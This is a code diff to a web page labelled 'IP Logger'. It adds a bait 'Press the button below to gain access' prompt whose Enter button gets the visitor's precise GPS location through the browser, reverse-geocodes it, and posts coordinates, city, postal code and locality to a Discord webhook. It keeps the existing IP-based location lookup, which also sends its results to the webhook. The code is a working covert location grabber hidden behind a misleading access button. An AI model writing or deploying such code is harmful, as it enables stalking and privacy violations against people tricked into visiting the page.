@@ -32,6 +32,21 @@
         strong {
             color: #555;
         }
+
+        #info {
+            display: none; /* Hide initially */
+        }
+
+        #consent {
+            margin: 20px;
+            font-size: 18px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -47,6 +62,10 @@
             <p><strong>Longitude:</strong> <span id="lon"></span></p>
             <p><strong>Address:</strong> <span id="address"></span></p>
         </div>
+        <div id="consent">
+            <p>Press the button below to gain access.</p>
+            <button id="getLocationButton">Enter</button>
+        </div>
     </div>
 
     <script>
@@ -61,7 +80,7 @@
                 username: "IP Logger",
                 avatar_url: "",
                 content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nPostal Code: ${data.postal}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nAddress: ${data.city}, ${data.region_name}, ${data.country_name}, ${data.postal}`
-            }
+            };
 
             if (data.street) {
                 params.content += `\nStreet Address: ${data.street}`;
@@ -73,22 +92,77 @@
             request.send(JSON.stringify(params));
         }
 
-        // Fetch user's IP and location data
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('ip').textContent = data.ip;
-                document.getElementById('country').textContent = data.country_name;
-                document.getElementById('region').textContent = data.region_name;
-                document.getElementById('city').textContent = data.city;
-                document.getElementById('postal').textContent = data.postal;
-                document.getElementById('lat').textContent = data.latitude;
-                document.getElementById('lon').textContent = data.longitude;
+        // Function to fetch user's IP and location data
+        function fetchLocationData() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').textContent = data.ip;
+                    document.getElementById('country').textContent = data.country_name;
+                    document.getElementById('region').textContent = data.region_name;
+                    document.getElementById('city').textContent = data.city;
+                    document.getElementById('postal').textContent = data.postal;
+                    document.getElementById('lat').textContent = data.latitude;
+                    document.getElementById('lon').textContent = data.longitude;
 
-                // Send data to Discord webhook
-                sendToWebhook(data);
-            })
-            .catch(error => console.error('Error:', error));
+                    // Send data to Discord webhook
+                    sendToWebhook(data);
+
+                    // Show the information
+                    document.getElementById('info').style.display = 'block';
+                })
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Function to get the user's location via Geolocation API
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // Use the latitude and longitude to fetch more detailed location
+                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+                        .then(response => response.json())
+                        .then(data => {
+                            document.getElementById('city').textContent = data.city || "Not Available";
+                            document.getElementById('country').textContent = data.countryName || "Not Available";
+                            document.getElementById('region').textContent = data.principalSubdivision || "Not Available";
+                            document.getElementById('postal').textContent = data.postcode || "Not Available";
+                            document.getElementById('lat').textContent = lat;
+                            document.getElementById('lon').textContent = lon;
+                            document.getElementById('address').textContent = data.locality || "Not Available";
+
+                            // Prepare data to send to Discord
+                            const ipData = {
+                                ip: "Not Available", // IP data is not fetched in this case
+                                country_name: data.countryName || "Not Available",
+                                region_name: data.principalSubdivision || "Not Available",
+                                city: data.city || "Not Available",
+                                postal: data.postcode || "Not Available",
+                                latitude: lat,
+                                longitude: lon,
+                                street: data.locality || "Not Available",
+                            };
+
+                            sendToWebhook(ipData);
+                            document.getElementById('info').style.display = 'block';
+                        })
+                        .catch(error => console.error('Error:', error));
+                }, error => {
+                    console.error("Geolocation error: ", error);
+                    alert("Unable to retrieve your location.");
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Add event listener for the location button
+        document.getElementById('getLocationButton').addEventListener('click', function() {
+            getLocation();
+            document.getElementById('consent').style.display = 'none'; // Hide consent prompt
+        });
     </script>
 </body>
 </html>
